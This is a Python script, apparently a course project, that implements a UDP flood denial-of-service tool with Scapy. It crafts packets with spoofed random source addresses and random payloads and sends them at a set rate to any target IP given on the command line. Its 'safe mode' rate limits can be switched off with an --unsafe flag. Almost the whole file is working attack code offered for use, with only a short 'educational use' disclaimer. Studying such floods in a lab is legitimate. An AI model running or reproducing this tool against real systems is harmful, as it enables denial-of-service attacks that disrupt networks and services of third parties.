#!/usr/bin/env python3
"""
SecureNet DC - UDP Flood Attack Simulator
CPEG 460 Bonus Project

Simulates UDP flood attack for educational purposes.
This volumetric attack sends large amounts of UDP packets
to overwhelm network bandwidth.

WARNING: For educational use only in controlled environments.
"""

from scapy.all import IP, UDP, send, Raw
import time
import random
import logging

logger = logging.getLogger(__name__)


class UDPFlood:
    """
    UDP Flood Attack Simulator.

    Sends high volumes of UDP packets to random or specific ports
    to consume bandwidth and processing resources.
    """

    def __init__(self, target_ip, target_port=None, safe_mode=True):
        """
        Initialize UDP Flood attack.

        Args:
            target_ip: Target IP address
            target_port: Target port (random if None)
            safe_mode: Limit attack intensity (default: True)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.safe_mode = safe_mode
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.max_pps = 200 if safe_mode else 2000
        self.max_size = 1024 if safe_mode else 65507

        logger.info(f"UDP Flood initialized: target={target_ip}")

    def craft_packet(self, src_ip=None, src_port=None, dst_port=None, size=1024):
        """
        Craft a UDP packet.

        Args:
            src_ip: Source IP (random if None)
            src_port: Source port (random if None)
            dst_port: Destination port (random if None)
            size: Payload size

        Returns:
            Scapy packet object
        """
        # Limit size in safe mode
        if self.safe_mode and size > self.max_size:
            size = self.max_size

        # Random source IP if not specified
        if src_ip is None:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                     f"{random.randint(1,254)}.{random.randint(1,254)}"

        # Random ports if not specified
        if src_port is None:
            src_port = random.randint(1024, 65535)
        if dst_port is None:
            dst_port = self.target_port or random.randint(1, 65535)

        # Craft IP layer
        ip_layer = IP(
            src=src_ip,
            dst=self.target_ip
        )

        # Craft UDP layer
        udp_layer = UDP(
            sport=src_port,
            dport=dst_port
        )

        # Random payload
        payload = Raw(load=bytes([random.randint(0, 255) for _ in range(size)]))

        return ip_layer / udp_layer / payload

    def start(self, duration=30, pps=None, size=1024, callback=None):
        """
        Start the UDP flood attack.

        Args:
            duration: Attack duration in seconds
            pps: Packets per second
            size: Packet payload size
            callback: Progress callback function

        Returns:
            dict: Attack statistics
        """
        if pps is None:
            pps = self.max_pps
        elif self.safe_mode and pps > self.max_pps:
            pps = self.max_pps
            logger.warning(f"Safe mode: PPS limited to {self.max_pps}")

        if self.safe_mode and size > self.max_size:
            size = self.max_size
            logger.warning(f"Safe mode: Size limited to {self.max_size}")

        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        start_time = time.time()
        interval = 1.0 / pps

        port_info = f":{self.target_port}" if self.target_port else " (random ports)"
        logger.warning(f"[!] Starting UDP Flood against {self.target_ip}{port_info}")
        logger.warning(f"[!] Duration: {duration}s, PPS: {pps}, Size: {size}")

        try:
            while self.running and (time.time() - start_time) < duration:
                # Craft and send packet
                pkt = self.craft_packet(size=size)
                send(pkt, verbose=0)
                self.packets_sent += 1
                self.bytes_sent += size + 28  # IP + UDP header

                # Progress callback
                if callback and self.packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    callback({
                        'packets_sent': self.packets_sent,
                        'bytes_sent': self.bytes_sent,
                        'elapsed': elapsed,
                        'rate': self.packets_sent / elapsed if elapsed > 0 else 0,
                        'bandwidth_mbps': (self.bytes_sent * 8 / elapsed) / 1e6 if elapsed > 0 else 0
                    })

                # Rate limiting
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.running = False

        elapsed = time.time() - start_time
        stats = {
            'attack_type': 'UDP_FLOOD',
            'target': self.target_ip,
            'target_port': self.target_port,
            'duration': elapsed,
            'packets_sent': self.packets_sent,
            'bytes_sent': self.bytes_sent,
            'average_pps': self.packets_sent / elapsed if elapsed > 0 else 0,
            'bandwidth_mbps': (self.bytes_sent * 8 / elapsed) / 1e6 if elapsed > 0 else 0
        }

        logger.info(f"[+] Attack complete: {self.packets_sent} packets, "
                   f"{self.bytes_sent/1024:.1f} KB")
        return stats

    def stop(self):
        """Stop the attack."""
        self.running = False
        logger.info("UDP Flood stopped")


def main():
    """Command-line interface for UDP flood."""
    import argparse

    parser = argparse.ArgumentParser(
        description='UDP Flood Attack Simulator (Educational)'
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=None,
                       help='Target port (random if not specified)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Duration in seconds (default: 30)')
    parser.add_argument('-r', '--rate', type=int, default=200,
                       help='Packets per second (default: 200)')
    parser.add_argument('-s', '--size', type=int, default=1024,
                       help='Packet size in bytes (default: 1024)')
    parser.add_argument('--unsafe', action='store_true',
                       help='Disable safe mode')

    args = parser.parse_args()

    attack = UDPFlood(args.target, args.port, safe_mode=not args.unsafe)
    attack.start(duration=args.duration, pps=args.rate, size=args.size)


if __name__ == '__main__':
    main()
